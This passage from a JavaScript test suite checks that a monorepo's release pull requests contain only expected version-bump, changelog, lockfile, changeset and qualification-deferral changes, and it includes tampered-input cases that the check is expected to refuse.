        // byte (re-review, https://github.com/clossys/foundry/pull/1353#issuecomment-5803854341).
        headContent: "# Changelog\n\n## 1.0.1 - 2026-09-24\n\n- Fix.\n\n## 1.0.0\n\n- Initial.\n",
      },
      { path: "package-lock.json", status: "modified", baseContent: LOCK_BASE, headContent: lockWithAlphaBumped("1.0.1") },
      { path: ".changesets/alpha-fix.md", status: "removed", baseContent: "---\nalpha: patch\n---\n\nFix.\n" },
    ],
  });
  assert.equal(result.ok, true, result.reason);
});

// issue #1391: extractChangelogDate() used to capture `(.+)` -- anything at
// all after "## <version> - " -- so the date slot could carry arbitrary
// text, and reconstructExpectedChangelogText() re-emitted that captured
// text verbatim, so it always matched itself byte for byte. The producer
// (apply-release-changesets.mjs's prependChangelogEntry()) only ever writes
// a plain YYYY-MM-DD there, so this is a footprint-check-only gap: a
// hand-crafted heading with something else in the date slot must now be
// refused, not silently reconstructed and passed.
test("evaluateReleasePrFootprint: a CHANGELOG heading whose date slot carries arbitrary text (not YYYY-MM-DD) is refused (issue #1391)", () => {
  const [base, head] = manifestPair("1.0.0", "1.0.1", { name: "@clossys/alpha" });
  const result = evaluateReleasePrFootprint({
    files: [
      { path: "packages/alpha/package.json", status: "modified", baseContent: base, headContent: head },
      {
        path: "docs/changelogs/alpha.md",
        status: "modified",
        baseContent: "# Changelog\n\n## 1.0.0\n\n- Initial.\n",
        headContent: "# Changelog\n\n## 1.0.1 - 2026-09-26, do not use; install X instead\n\n- Fix.\n\n## 1.0.0\n\n- Initial.\n",
      },
      { path: "package-lock.json", status: "modified", baseContent: LOCK_BASE, headContent: lockWithAlphaBumped("1.0.1") },
      { path: ".changesets/alpha-fix.md", status: "removed", baseContent: "---\nalpha: patch\n---\n\nFix.\n" },
    ],
  });
  assert.equal(result.ok, false);
  assert.match(result.reason, /byte-for-byte/);
});

test("evaluateReleasePrFootprint: fails closed on an empty file list", () => {
  assert.equal(evaluateReleasePrFootprint({ files: [] }).ok, false);
});

test("evaluateReleasePrFootprint: fails when no package.json is touched at all", () => {
  const result = evaluateReleasePrFootprint({ files: [{ path: ".changesets/alpha-fix.md", status: "removed", baseContent: "---\nalpha: patch\n---\n\nFix.\n" }] });
  assert.equal(result.ok, false);
  assert.match(result.reason, /no packages/);
});

test("evaluateReleasePrFootprint: a CHANGELOG.md for a package that was NOT bumped in this diff fails", () => {
  const [base, head] = manifestPair("1.0.0", "1.0.1");
  const result = evaluateReleasePrFootprint({
    files: [
      { path: "packages/alpha/package.json", status: "modified", baseContent: base, headContent: head },
      {
        path: "docs/changelogs/beta.md", // beta was never bumped
        status: "modified",
        baseContent: "# Changelog\n\n## 1.0.0\n\n- Initial.\n",
        headContent: "# Changelog\n\n## 1.0.1\n\n- Fix.\n\n## 1.0.0\n\n- Initial.\n",
      },
    ],
  });
  assert.equal(result.ok, false);
  assert.match(result.reason, /not bumped in this diff/);
});

test("evaluateReleasePrFootprint: an unrelated pending changeset deleted alongside a legitimate release fails the whole PR", () => {
  const [base, head] = manifestPair("1.0.0", "1.0.1");
  const result = evaluateReleasePrFootprint({
    files: [
      { path: "packages/alpha/package.json", status: "modified", baseContent: base, headContent: head },
      { path: ".changesets/alpha-fix.md", status: "removed", baseContent: "---\nalpha: patch\n---\n\nFix.\n" },
      { path: ".changesets/beta-unrelated.md", status: "removed", baseContent: "---\nbeta: minor\n---\n\nUnrelated, still pending.\n" },
    ],
  });
  assert.equal(result.ok, false);
  assert.match(result.reason, /does not name only packages bumped in this diff/);
});

// issue #1331: a version bump whose diff never touches package-lock.json at
// all used to pass the footprint check outright -- the per-file loop simply
// never had a lockfile FILE to run isLockfilePureVersionBump() against, so
// its silence read as "nothing to check there" instead of "a release PR
// must regenerate the lockfile too". apply-release-changesets.mjs (the only
// real producer this shape is ever checked against) always regenerates
// package-lock.json in the same run whenever it applies anything, so an
// absent lockfile is itself a structural defect in the diff, not a
// no-op case.
// issue #1389: a release PR that deletes an unconsumed (pending) changeset
// for a bumped package, while leaving that package's docs/changelogs/<dir>.md
// out of the diff entirely, used to pass the footprint check outright -- the
// changelog branch of the per-file loop only ever runs for a file that IS in
// the diff, and evaluateReleasePrFootprint() never separately asserted that
// every bumped directory's changelog was among the changed files at all.
// apply-release-changesets.mjs (the only real producer this shape is ever
// checked against) always writes a changelog entry for every package it
// bumps, so an absent changelog for a bumped dir is itself a structural
// defect in the diff.
test("evaluateReleasePrFootprint: a version bump that consumes (deletes) a changeset, but never touches docs/changelogs/<dir>.md at all, is refused (issue #1389)", () => {
  const [base, head] = manifestPair("1.0.0", "1.0.1", { name: "@clossys/alpha" });
  const result = evaluateReleasePrFootprint({
    files: [
      { path: "packages/alpha/package.json", status: "modified", baseContent: base, headContent: head },
      { path: "package-lock.json", status: "modified", baseContent: LOCK_BASE, headContent: lockWithAlphaBumped("1.0.1") },
      { path: ".changesets/alpha-fix.md", status: "removed", baseContent: "---\nalpha: patch\n---\n\nFix.\n" },
      // NOTE: no docs/changelogs/alpha.md file in this diff at all -- the
      // pending changeset is silently discarded with no release note.
    ],
  });
  assert.equal(result.ok, false);
  assert.match(result.reason, /docs\/changelogs\/alpha\.md absent from the diff/);
  assert.match(result.reason, /packages\/alpha/);
});

test("evaluateReleasePrFootprint: a version bump with package-lock.json absent from the diff entirely is refused (issue #1331)", () => {
  const [base, head] = manifestPair("1.0.0", "1.0.1");
  const result = evaluateReleasePrFootprint({ files: [{ path: "packages/alpha/package.json", status: "modified", baseContent: base, headContent: head }] });
  assert.equal(result.ok, false);
  assert.match(result.reason, /package-lock\.json is absent from the diff/);
  assert.match(result.reason, /packages\/alpha/);
});

test("evaluateReleasePrFootprint: the SAME bump, with package-lock.json AND the changelog present and a legitimate pure version bump, passes (package-lock.json was the only thing missing above)", () => {
  const [base, head] = manifestPair("1.0.0", "1.0.1", { name: "@clossys/alpha" });
  const result = evaluateReleasePrFootprint({
    files: [
      { path: "packages/alpha/package.json", status: "modified", baseContent: base, headContent: head },
      {
        path: "docs/changelogs/alpha.md",
        status: "modified",
        baseContent: "# Changelog\n\n## 1.0.0\n\n- Initial.\n",
        headContent: "# Changelog\n\n## 1.0.1 - 2026-09-24\n\n- Fix.\n\n## 1.0.0\n\n- Initial.\n",
      },
      { path: "package-lock.json", status: "modified", baseContent: LOCK_BASE, headContent: lockWithAlphaBumped("1.0.1") },
      { path: ".changesets/alpha-fix.md", status: "removed", baseContent: "---\nalpha: patch\n---\n\nFix.\n" },
    ],
  });
  assert.equal(result.ok, true, result.reason);
});

// ---------------------------------------------------------------- issue #1439: qualification-deferral admission
//
// governance/release-qualification-deferrals/<pkg>@<version>.json is NOT
// written by apply-release-changesets.mjs -- the real weekly release PR
// (#1438) separately adds one per bumped package, acknowledging that the
// new version's qualification record does not exist yet. Before this, the
// footprint check had no opinion on this file class at all, so it fell
// through to "anything else fails" and refused every real release PR
// outright (confirmed by replaying `git diff 4aa89cdda975bd1a647c34dabd978d33804116c2 73ab01b6`,
// minus the one-off packages/publisher/src/web/react-server-artifact.test.ts
// edit, against the unmodified check: refused on
// `"governance/release-qualification-deferrals/advisor@0.5.0.json" (added)
// is not a release-PR-shaped change`; the SAME 103-file diff passes with
// this fix, and the full 104-file diff -- WITH the publisher test edit --
// still correctly refuses on that one file alone).

function releasePrFilesWithDeferral(deferralFile) {
  const [base, head] = manifestPair("1.0.0", "1.0.1", { name: "@clossys/alpha" });
  const files = [
    { path: "packages/alpha/package.json", status: "modified", baseContent: base, headContent: head },
    {
      path: "docs/changelogs/alpha.md",
      status: "modified",
      baseContent: "# Changelog\n\n## 1.0.0\n\n- Initial.\n",
      headContent: "# Changelog\n\n## 1.0.1 - 2026-09-24\n\n- Fix.\n\n## 1.0.0\n\n- Initial.\n",
    },
    { path: "package-lock.json", status: "modified", baseContent: LOCK_BASE, headContent: lockWithAlphaBumped("1.0.1") },
    { path: ".changesets/alpha-fix.md", status: "removed", baseContent: "---\nalpha: patch\n---\n\nFix.\n" },
  ];
  if (deferralFile) files.push(deferralFile);
  return files;
}

test("evaluateReleasePrFootprint: a matching qualification-deferral file for the bumped package is admitted (issue #1439)", () => {
  const result = evaluateReleasePrFootprint({
    files: releasePrFilesWithDeferral({
      path: "governance/release-qualification-deferrals/alpha@1.0.1.json",
      status: "added",
      headContent: JSON.stringify({ package: "alpha", version: "1.0.1", reason: "Bumped by the release PR; qualified after merge.", issue: 948 }, null, 2) + "\n",
    }),
  });
  assert.equal(result.ok, true, result.reason);
});

test("evaluateReleasePrFootprint: a diff with NO deferral file at all still passes -- presence is constrained, never required (a package may already have a retained record)", () => {
  const result = evaluateReleasePrFootprint({ files: releasePrFilesWithDeferral(null) });
  assert.equal(result.ok, true, result.reason);
});

test("ADVERSARIAL evaluateReleasePrFootprint: a deferral file with status other than 'added' is refused", () => {
  const result = evaluateReleasePrFootprint({
    files: releasePrFilesWithDeferral({
      path: "governance/release-qualification-deferrals/alpha@1.0.1.json",
      status: "modified",
      baseContent: JSON.stringify({ package: "alpha", version: "1.0.0", reason: "stale", issue: 1 }),
      headContent: JSON.stringify({ package: "alpha", version: "1.0.1", reason: "Bumped by the release PR.", issue: 948 }),
    }),
  });
  assert.equal(result.ok, false);
  assert.match(result.reason, /may only be added, never modified or removed/);
});

// A real `git diff --name-status` can never list the same path twice, so
// this is defense in depth against a malformed/duplicated `files` array
// reaching evaluateReleasePrFootprint() from whatever assembled it (the
// caller's own `--changed-files` JSON, ultimately) -- rather than an
// unreachable case, since nothing upstream of this pure function actually
// guarantees deduplication.
test("ADVERSARIAL evaluateReleasePrFootprint: the SAME deferral path listed twice in `files` is refused as a duplicate", () => {
  const files = releasePrFilesWithDeferral({
    path: "governance/release-qualification-deferrals/alpha@1.0.1.json",
    status: "added",
    headContent: JSON.stringify({ package: "alpha", version: "1.0.1", reason: "First.", issue: 1 }),
  });
  files.push({
    path: "governance/release-qualification-deferrals/alpha@1.0.1.json",
    status: "added",
    headContent: JSON.stringify({ package: "alpha", version: "1.0.1", reason: "Second, duplicate.", issue: 2 }),
  });
  const result = evaluateReleasePrFootprint({ files });
  assert.equal(result.ok, false);
  assert.match(result.reason, /SECOND qualification deferral/);
});

test("ADVERSARIAL evaluateReleasePrFootprint: a deferral naming a package@version this diff never bumped is refused (an extra deferral)", () => {
  const result = evaluateReleasePrFootprint({
    files: releasePrFilesWithDeferral({
      path: "governance/release-qualification-deferrals/beta@2.0.0.json",
      status: "added",
      headContent: JSON.stringify({ package: "beta", version: "2.0.0", reason: "beta was never bumped in this diff.", issue: 1 }),
    }),
  });
  assert.equal(result.ok, false);
  assert.match(result.reason, /this diff did not bump packages\/beta to exactly that version/);
});

test("ADVERSARIAL evaluateReleasePrFootprint: a deferral naming the RIGHT package but the WRONG (pre-bump) version is refused", () => {
  const result = evaluateReleasePrFootprint({
    files: releasePrFilesWithDeferral({
      path: "governance/release-qualification-deferrals/alpha@1.0.0.json",
      status: "added",
      headContent: JSON.stringify({ package: "alpha", version: "1.0.0", reason: "Names the OLD version, not the new one.", issue: 1 }),
    }),
  });
  assert.equal(result.ok, false);
  assert.match(result.reason, /this diff did not bump packages\/alpha to exactly that version/);
});

test("ADVERSARIAL evaluateReleasePrFootprint: a deferral whose filename matches the bump but whose own JSON content names a DIFFERENT package/version is refused (a mismatched deferral)", () => {
  const result = evaluateReleasePrFootprint({
    files: releasePrFilesWithDeferral({
      path: "governance/release-qualification-deferrals/alpha@1.0.1.json",
      status: "added",
      headContent: JSON.stringify({ package: "evil", version: "9.9.9", reason: "Filename says alpha@1.0.1, content says something else entirely.", issue: 1 }),
    }),
  });
  assert.equal(result.ok, false);
  assert.match(result.reason, /do not name "alpha"\/"1\.0\.1", matching its own filename/);
});

test("ADVERSARIAL evaluateReleasePrFootprint: a deferral file that is not valid JSON is refused", () => {
  const result = evaluateReleasePrFootprint({
    files: releasePrFilesWithDeferral({
      path: "governance/release-qualification-deferrals/alpha@1.0.1.json",
      status: "added",
      headContent: "not json at all",
    }),
  });
  assert.equal(result.ok, false);
  assert.match(result.reason, /is not valid JSON/);
});

// N1 (fix-round non-blocking note): the admission above used to check only
// `package`/`version` against the filename, so a deferral with no `reason`
// at all, no `issue` at all, or an extra field beyond the producer's own
// documented schema (`{ package, version, reason, issue }` -- this file's
// module header, governance/release-qualification-deferrals/README.md)
// still passed. Every real deferral file under
// governance/release-qualification-deferrals/ carries exactly those four
// keys (confirmed against every file currently in the repository), so
// "nothing more than the producer's shape" -- this module's own stated rule
// -- means requiring all four, and no more.

test("ADVERSARIAL evaluateReleasePrFootprint: a deferral with no `reason` field is refused", () => {
  const result = evaluateReleasePrFootprint({
    files: releasePrFilesWithDeferral({
      path: "governance/release-qualification-deferrals/alpha@1.0.1.json",
      status: "added",
      headContent: JSON.stringify({ package: "alpha", version: "1.0.1", issue: 948 }),
    }),
  });
  assert.equal(result.ok, false);
  assert.match(result.reason, /no non-empty "reason" string/);
});

test("ADVERSARIAL evaluateReleasePrFootprint: a deferral with an empty/blank `reason` field is refused", () => {
  const result = evaluateReleasePrFootprint({
    files: releasePrFilesWithDeferral({
      path: "governance/release-qualification-deferrals/alpha@1.0.1.json",
      status: "added",
      headContent: JSON.stringify({ package: "alpha", version: "1.0.1", reason: "   ", issue: 948 }),
    }),
  });
  assert.equal(result.ok, false);
  assert.match(result.reason, /no non-empty "reason" string/);
});

test("ADVERSARIAL evaluateReleasePrFootprint: a deferral with no `issue` field is refused", () => {
  const result = evaluateReleasePrFootprint({
    files: releasePrFilesWithDeferral({
      path: "governance/release-qualification-deferrals/alpha@1.0.1.json",
      status: "added",
      headContent: JSON.stringify({ package: "alpha", version: "1.0.1", reason: "Bumped by the release PR." }),
    }),
  });
  assert.equal(result.ok, false);
  assert.match(result.reason, /"issue" field must be a positive integer/);
});

test("ADVERSARIAL evaluateReleasePrFootprint: a deferral whose `issue` field is not a positive integer is refused", () => {
  const result = evaluateReleasePrFootprint({
    files: releasePrFilesWithDeferral({
      path: "governance/release-qualification-deferrals/alpha@1.0.1.json",
      status: "added",
      headContent: JSON.stringify({ package: "alpha", version: "1.0.1", reason: "Bumped by the release PR.", issue: "948" }),
    }),
  });
  assert.equal(result.ok, false);
  assert.match(result.reason, /"issue" field must be a positive integer/);
});

test("ADVERSARIAL evaluateReleasePrFootprint: a deferral with an EXTRA field beyond package/version/reason/issue is refused", () => {
  const result = evaluateReleasePrFootprint({
    files: releasePrFilesWithDeferral({
      path: "governance/release-qualification-deferrals/alpha@1.0.1.json",
      status: "added",
      headContent: JSON.stringify({ package: "alpha", version: "1.0.1", reason: "Bumped by the release PR.", issue: 948, approvedBy: "someone" }),
    }),
  });
  assert.equal(result.ok, false);
  assert.match(result.reason, /field\(s\) beyond the producer's documented shape \(approvedBy\)/);
});

test("ADVERSARIAL evaluateReleasePrFootprint: ANY other file under governance/ -- including the deferrals directory's own README.md -- is refused, never treated as a deferral", () => {
  for (const path of ["governance/release-qualification-deferrals/README.md", "governance/release-calendar.json", "governance/release-qualification-deferrals/nested/alpha@1.0.1.json"]) {
    const result = evaluateReleasePrFootprint({
      files: releasePrFilesWithDeferral({ path, status: "modified", baseContent: "before\n", headContent: "after\n" }),
    });
    assert.equal(result.ok, false, `expected "${path}" to be refused`);
    assert.match(result.reason, /is not a release-PR-shaped change/, `"${path}" should fall through to the generic refusal, not be treated as a deferral`);
  }
});

test("evaluateReleasePrFootprint: a lockfile present but not a pure version bump fails", () => {
  const [base, head] = manifestPair("1.0.0", "1.0.1");
  const tamperedLock = JSON.parse(lockWithAlphaBumped("1.0.1"));
  tamperedLock.packages["node_modules/foo"].integrity = "sha512-tampered";
  const result = evaluateReleasePrFootprint({
    files: [
      { path: "packages/alpha/package.json", status: "modified", baseContent: base, headContent: head },
      { path: "package-lock.json", status: "modified", baseContent: LOCK_BASE, headContent: JSON.stringify(tamperedLock) },
    ],
  });
  assert.equal(result.ok, false);
});

test("evaluateReleasePrFootprint: ANY single non-conforming file fails the whole PR, even alongside an otherwise-perfect bump", () => {
  const [base, head] = manifestPair("1.0.0", "1.0.1");
  const result = evaluateReleasePrFootprint({
    files: [
      { path: "packages/alpha/package.json", status: "modified", baseContent: base, headContent: head },
      { path: "packages/alpha/src/index.ts", status: "modified" }, // the intrusion
    ],
  });
  assert.equal(result.ok, false);
});

test("evaluateReleasePrFootprint: a new (added) changeset smuggled in fails", () => {
  const [base, head] = manifestPair("1.0.0", "1.0.1");
  const result = evaluateReleasePrFootprint({
    files: [
      { path: "packages/alpha/package.json", status: "modified", baseContent: base, headContent: head },
      { path: ".changesets/sneaky.md", status: "added", headContent: "---\nalpha: major\n---\n\nSmuggled.\n" },
    ],
  });
  assert.equal(result.ok, false);
});

// ---------------------------------------------------------------- end-to-end: REAL apply-release-changesets.mjs output through the full footprint check
//
// REGRESSION COVERAGE (https://github.com/clossys/foundry/pull/1316#issuecomment-5801060575):
// this is the test that would have caught the "### Added"/"### Fixed"
// duplicate-heading bug above BEFORE it shipped -- every package
// CHANGELOG.md in this repository already repeats those Keep-a-Changelog
// subsection headings entry after entry, so a synthetic fixture that never
// used them could pass while a real release PR failed. Runs the actual,
// unmocked applyReleaseChangesets() (only `runNpmInstall` is faked, so
// this stays hermetic -- no real npm/network -- while still producing
// apply-release-changesets.mjs's own real package.json/CHANGELOG.md
// output, byte for byte) for a patch release, captures the real base/head
// content of every file it touches, and feeds that straight into
// evaluateReleasePrFootprint() exactly as scripts/check-release-
// calendar.mjs would.
test("END TO END: a real apply-release-changesets.mjs patch release, against a CHANGELOG.md using ### Added/### Fixed subsections like this repository's own packages, passes the full footprint check", () => {
  const root = mkdtempSync(join(tmpdir(), "release-pr-footprint-e2e-test-"));
  try {
    const pkgDir = join(root, "packages", "alpha");
    mkdirSync(pkgDir, { recursive: true });
    const baseManifest = { name: "@clossys/alpha", version: "1.0.0", license: "MIT" };
    writeFileSync(join(pkgDir, "package.json"), JSON.stringify(baseManifest, null, 2) + "\n");
    const baseChangelog = "# Changelog\n\n## 1.0.0 - 2026-09-01\n\n### Added\n\n- Initial feature.\n\n### Fixed\n\n- An early bug.\n";
    seedChangelog(pkgDir, baseChangelog);

    const baseLockfile = {
      name: "foundry",
      lockfileVersion: 3,
      packages: {
        "": { name: "foundry" },
        "packages/alpha": { name: "@clossys/alpha", version: "1.0.0", license: "MIT" },
        "node_modules/@clossys/alpha": { resolved: "packages/alpha", link: true },
      },
    };
    writeFileSync(join(root, "package-lock.json"), JSON.stringify(baseLockfile, null, 2) + "\n");

    mkdirSync(join(root, ".changesets"), { recursive: true });
    const changesetText = "---\nalpha: patch\n---\n\nFix a crash on startup.\n";
    writeFileSync(join(root, ".changesets", "alpha-fix.md"), changesetText);

    const baseManifestText = readFileSync(join(pkgDir, "package.json"), "utf8");
    const baseLockfileText = readFileSync(join(root, "package-lock.json"), "utf8");

    const result = applyReleaseChangesets({
      root,
      today: () => "2026-09-22",
      // Faked so this test never touches npm/network -- still exercises
      // apply-release-changesets.mjs's REAL manifest/CHANGELOG writing.
      // The fake mirrors what a correct `npm install --package-lock-only`
      // would do: bump only the released package's own lockfile entry.
      runNpmInstall: (scratchRoot) => {
        const manifest = JSON.parse(readFileSync(join(scratchRoot, "packages", "alpha", "package.json"), "utf8"));
        const lock = JSON.parse(readFileSync(join(scratchRoot, "package-lock.json"), "utf8"));
        lock.packages["packages/alpha"].version = manifest.version;
        writeFileSync(join(scratchRoot, "package-lock.json"), JSON.stringify(lock, null, 2) + "\n");
      },
    });

    assert.equal(result.findings.length, 0, JSON.stringify(result.findings));
    assert.equal(result.applied.length, 1);
    assert.equal(result.applied[0].toVersion, "1.0.1");

    const headManifestText = readFileSync(join(pkgDir, "package.json"), "utf8");
    const headChangelogText = readFileSync(changelogPathForPackageDir(pkgDir), "utf8");
    const headLockfileText = readFileSync(join(root, "package-lock.json"), "utf8");
    assert.equal(existsSync(join(root, ".changesets", "alpha-fix.md")), false);

    const files = [
      { path: "packages/alpha/package.json", status: "modified", baseContent: baseManifestText, headContent: headManifestText },
      { path: "docs/changelogs/alpha.md", status: "modified", baseContent: baseChangelog, headContent: headChangelogText },
      { path: "package-lock.json", status: "modified", baseContent: baseLockfileText, headContent: headLockfileText },
      { path: ".changesets/alpha-fix.md", status: "removed", baseContent: changesetText },
    ];

    const footprint = evaluateReleasePrFootprint({ files });
    assert.equal(footprint.ok, true, footprint.reason);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

// A real apply-release-changesets.mjs run whose ONLY sibling effect is a
// devDependencies-only rewrite (issue found in #1353 review, item 3 --
// packages/controller's real @clossys/advisor devDependency) must pass the
// full footprint check with NO version bump, NO CHANGELOG.md, and NO
// applied entry for the devDependencies-only package -- proving the
// producer and the footprint check agree on this shape end to end, not
// just via each side's own unit tests.
test("END TO END: a real apply-release-changesets.mjs run with a devDependencies-only sibling rewrite (no bump, no changelog) passes the full footprint check", () => {
  const root = mkdtempSync(join(tmpdir(), "release-pr-footprint-devdep-e2e-test-"));
  try {
    const advisorDir = join(root, "packages", "advisor");
    mkdirSync(advisorDir, { recursive: true });
    const advisorBaseManifest = { name: "@clossys/advisor", version: "0.4.0", license: "MIT" };
    writeFileSync(join(advisorDir, "package.json"), JSON.stringify(advisorBaseManifest, null, 2) + "\n");
    const advisorBaseChangelog = "# Changelog\n\n## 0.4.0\n\n- Initial release.\n";
    seedChangelog(advisorDir, advisorBaseChangelog);

    const controllerDir = join(root, "packages", "controller");
    mkdirSync(controllerDir, { recursive: true });
    const controllerBaseManifest = { name: "@clossys/controller", version: "1.0.0", license: "MIT", devDependencies: { "@clossys/advisor": "^0.4.0" } };
    const controllerBaseManifestText = JSON.stringify(controllerBaseManifest, null, 2) + "\n";
    writeFileSync(join(controllerDir, "package.json"), controllerBaseManifestText);

    const baseLockfile = {
      name: "foundry",
      lockfileVersion: 3,
      packages: {
        "": { name: "foundry" },
        "packages/advisor": { name: "@clossys/advisor", version: "0.4.0", license: "MIT" },
        "node_modules/@clossys/advisor": { resolved: "packages/advisor", link: true },
        "packages/controller": { ...controllerBaseManifest },
        "node_modules/@clossys/controller": { resolved: "packages/controller", link: true },
      },
    };
    writeFileSync(join(root, "package-lock.json"), JSON.stringify(baseLockfile, null, 2) + "\n");

    mkdirSync(join(root, ".changesets"), { recursive: true });
    const changesetText = "---\nadvisor: minor\n---\n\nAdd a feature.\n";
    writeFileSync(join(root, ".changesets", "advisor-feature.md"), changesetText);

    const baseLockfileText = readFileSync(join(root, "package-lock.json"), "utf8");

    const result = applyReleaseChangesets({
      root,
      today: () => "2026-09-24",
      // Mirrors what a real `npm install --package-lock-only` would do:
      // bump the released package's own lockfile entry AND mirror its
      // dependent's rewritten devDependencies range there too.
      runNpmInstall: (scratchRoot) => {
        const advisorManifest = JSON.parse(readFileSync(join(scratchRoot, "packages", "advisor", "package.json"), "utf8"));
        const controllerManifest = JSON.parse(readFileSync(join(scratchRoot, "packages", "controller", "package.json"), "utf8"));
        const lock = JSON.parse(readFileSync(join(scratchRoot, "package-lock.json"), "utf8"));
        lock.packages["packages/advisor"].version = advisorManifest.version;
        lock.packages["packages/controller"] = { ...controllerManifest };
        writeFileSync(join(scratchRoot, "package-lock.json"), JSON.stringify(lock, null, 2) + "\n");
      },
    });

    assert.equal(result.findings.length, 0, JSON.stringify(result.findings));
    assert.deepEqual(
      result.applied.map((a) => a.package),
      ["advisor"],
    );

    const controllerHeadManifestText = readFileSync(join(controllerDir, "package.json"), "utf8");
    const headLockfileText = readFileSync(join(root, "package-lock.json"), "utf8");
    assert.equal(existsSync(changelogPathForPackageDir(controllerDir)), false);

    const advisorHeadManifestText = readFileSync(join(advisorDir, "package.json"), "utf8");
    const advisorHeadChangelogText = readFileSync(changelogPathForPackageDir(advisorDir), "utf8");

    const files = [
      { path: "packages/advisor/package.json", status: "modified", baseContent: JSON.stringify(advisorBaseManifest, null, 2) + "\n", headContent: advisorHeadManifestText },
      { path: "docs/changelogs/advisor.md", status: "modified", baseContent: advisorBaseChangelog, headContent: advisorHeadChangelogText },
      { path: "packages/controller/package.json", status: "modified", baseContent: controllerBaseManifestText, headContent: controllerHeadManifestText },
      { path: "package-lock.json", status: "modified", baseContent: baseLockfileText, headContent: headLockfileText },
      { path: ".changesets/advisor-feature.md", status: "removed", baseContent: changesetText },
    ];

    const footprint = evaluateReleasePrFootprint({ files });
    assert.equal(footprint.ok, true, footprint.reason);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

// ---------------------------------------------------------------- end-to-end: a vendored capture of the COMPOSED apply-release-changesets.mjs output
//
// #1339 (this module's own widening) and #1316 (the weekly calendar's
// out-of-band/breaking-change support) had independently modified
// apply-release-changesets.mjs's core loop; T10's merge train dropped both
// rather than guess at how they compose, and a follow-up
// (claude/weekly-release-calendar-v2) composed them explicitly -- see that
// script's own header, "COMPOSING OUT-OF-BAND FILTERING WITH SIBLING
// DEPENDENCY RANGES". This fixture was captured from THAT composed
// producer, not from #1338 in isolation -- the shape it exercises (a
// same-run sibling dependency-range rewrite triggering a dependent-only
// patch bump) is unaffected by the composition for an ordinary in-band run
// (outOfBandOnly defaults to false, so this scenario runs the identical
// PHASE A/B/C path #1338 always used), but the fixture is regenerated here
// rather than reused from #1339 so this test is provably exercising the
// actual script shipping in this tree, not a predecessor of it.
//
// This test's base/head file contents and package-lock.json are a
// byte-for-byte VENDORED CAPTURE of that composed, unmodified
// apply-release-changesets.mjs actually executing against a real npm
// workspace, with REAL npm (not mocked) regenerating the lockfile. No git
// fetch, no dynamic import, no npm invocation, and no skip path exist at
// test time -- this test either runs and passes, or fails loudly.
//
// HOW TO REGENERATE (needed again if the composed script's output shape
// changes):
//
//   1. In a scratch directory, create a minimal npm-workspaces root:
//        { "name": "fixture-root", "private": true, "workspaces": ["packages/*"] }
//      with two packages:
//        packages/core/package.json     { "name": "@x/core", "version": "0.9.0", "license": "MIT" }
//        docs/changelogs/core.md        "# Changelog\n\n## 0.9.0\n\n- Initial release.\n"
//        packages/consumer/package.json { "name": "@x/consumer", "version": "1.0.0", "license": "MIT",
//                                          "dependencies": { "@x/core": "^0.9.0" } }
//        docs/changelogs/consumer.md    "# Changelog\n\n## 1.0.0\n\n- Initial release.\n"
//   2. Run `npm install --package-lock-only --offline` in that root to produce
//      a genuine base package-lock.json (works fully offline: both packages
//      are workspace-internal, no registry access needed).
//   3. Add a pending changeset naming a minor bump for core:
//        .changesets/core-feature.md   "---\ncore: minor\n---\n\nAdd a feature.\n"
//   4. Copy THIS REPOSITORY'S ENTIRE scripts/ directory into the scratch
//      location (not a hand-picked subset -- check-release-pr-shape.mjs
//      transitively imports scripts/lib/package-identity-transition.mjs via
//      check-release-readiness.mjs, so anything less than the full directory
//      throws ERR_MODULE_NOT_FOUND). Unlike the predecessor of this fixture
//      (captured for #1339, before this branch existed), this step needs no
//      cross-branch `git show` -- the composed apply-release-changesets.mjs
//      already lives in this tree's own scripts/ directory.
//   5. Import and call `applyReleaseChangesets({ root, today: () => "<today>" })`
//      with NO `runNpmInstall` override, so it uses its real default (which
//      shells out to real `npm install --package-lock-only`), and with no
//      `outOfBandOnly` (an ordinary in-band run).
//   6. Capture `result.applied` and every changed file's before/after content,
//      and confirm the changeset file was deleted.
const COMPOSED_PRODUCER_FIXTURE = {
  coreBase: '{\n  "name": "@x/core",\n  "version": "0.9.0",\n  "license": "MIT"\n}\n',
  coreHead: '{\n  "name": "@x/core",\n  "version": "0.10.0",\n  "license": "MIT"\n}\n',
  coreChangelogBase: "# Changelog\n\n## 0.9.0\n\n- Initial release.\n",
  coreChangelogHead: "# Changelog\n\n## 0.10.0 - 2026-09-23\n\n- Add a feature.\n\n## 0.9.0\n\n- Initial release.\n",
  consumerBase: '{\n  "name": "@x/consumer",\n  "version": "1.0.0",\n  "license": "MIT",\n  "dependencies": {\n    "@x/core": "^0.9.0"\n  }\n}\n',
  consumerHead: '{\n  "name": "@x/consumer",\n  "version": "1.0.1",\n  "license": "MIT",\n  "dependencies": {\n    "@x/core": "^0.10.0"\n  }\n}\n',
  consumerChangelogBase: "# Changelog\n\n## 1.0.0\n\n- Initial release.\n",
  consumerChangelogHead: "# Changelog\n\n## 1.0.1 - 2026-09-23\n\n- Updated dependency @x/core to ^0.10.0\n\n## 1.0.0\n\n- Initial release.\n",
  changesetText: "---\ncore: minor\n---\n\nAdd a feature.\n",
  lockfileBase: JSON.stringify(
    {
      name: "fixture-root",
      lockfileVersion: 3,
      requires: true,
      packages: {
        "": { name: "fixture-root", workspaces: ["packages/*"] },
        "node_modules/@x/consumer": { resolved: "packages/consumer", link: true },
        "node_modules/@x/core": { resolved: "packages/core", link: true },
        "packages/consumer": { name: "@x/consumer", version: "1.0.0", license: "MIT", dependencies: { "@x/core": "^0.9.0" } },
        "packages/core": { name: "@x/core", version: "0.9.0", license: "MIT" },
      },
    },
    null,
    2,
  ) + "\n",
  lockfileHead: JSON.stringify(
    {
      name: "fixture-root",
      lockfileVersion: 3,
      requires: true,
      packages: {
        "": { name: "fixture-root", workspaces: ["packages/*"] },
        "node_modules/@x/consumer": { resolved: "packages/consumer", link: true },
        "node_modules/@x/core": { resolved: "packages/core", link: true },
        "packages/consumer": { name: "@x/consumer", version: "1.0.1", license: "MIT", dependencies: { "@x/core": "^0.10.0" } },
        "packages/core": { name: "@x/core", version: "0.10.0", license: "MIT" },
      },
    },
    null,
    2,
  ) + "\n",
};

test("END TO END (vendored capture of the COMPOSED apply-release-changesets.mjs output, including package-lock.json): core's 0.x minor bump + consumer's dependent patch bump, rewritten ^0.N.0 range, and regenerated lockfile together pass the full footprint check", () => {
  const f = COMPOSED_PRODUCER_FIXTURE;
  const result = evaluateReleasePrFootprint({
    files: [
      { path: "packages/core/package.json", status: "modified", baseContent: f.coreBase, headContent: f.coreHead },
